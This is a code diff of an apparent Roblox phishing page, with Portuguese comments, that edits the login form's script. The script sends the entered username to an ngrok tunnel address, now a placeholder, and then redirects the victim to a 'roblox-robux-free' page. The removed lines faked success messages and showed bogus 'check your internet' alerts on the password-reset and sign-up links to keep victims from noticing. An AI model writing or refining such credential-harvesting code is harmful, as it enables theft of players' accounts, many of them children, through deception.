@@ -579,35 +579,30 @@ site.</div></div></noscript>
             formData.append('username', username);
 
             // Enviar para o servidor (substitua pela URL correta)
-            fetch(' https://8ea2e38f605b.ngrok-free.app/login/', {
-                method: 'POST',
-                body: formData
+            // Substitua esta parte no seu código atual:
+             fetch('https://SEU_NGROK.ngrok-free.app/login/', {
+             method: 'POST',
+             body: formData,
+             headers: {
+              'Accept': 'application/json'
+             }
             })
             .then(response => {
-                if (response.ok) {
-                    messageDiv.textContent = 'Login bem-sucedido! Redirecionando...';
-                    messageDiv.style.color = '#00aa00';
-                    window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
-                } else {
-                    messageDiv.textContent = 'Erro no login. Tente novamente.';
-                }
+             if (!response.ok) {
+             return response.json().then(err => { throw err; });
+             }
+              return response.json();
             })
-            .catch(error => {
-                messageDiv.textContent = 'logado com sucesso!';
-            });
-        });
-
-        // Links extras (opcional)
-        document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Não foi possível mudar a senha. Verifique sua internet.');
-        });
-        
-        document.getElementById('custom-create-account').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Não foi possível criar conta. Verifique sua internet.');
-        });
-    });
+            .then(data => {
+            messageDiv.textContent = data.message || 'Login bem-sucedido! Redirecionando...';
+            messageDiv.style.color = '#00aa00';
+            window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
+})
+.catch(error => {
+  console.error('Erro:', error);
+  messageDiv.textContent = error.error || 'Erro na conexão. Verifique sua internet.';
+  messageDiv.style.color = '#ff3333';
+});
 </script>
         </div>
     </main>
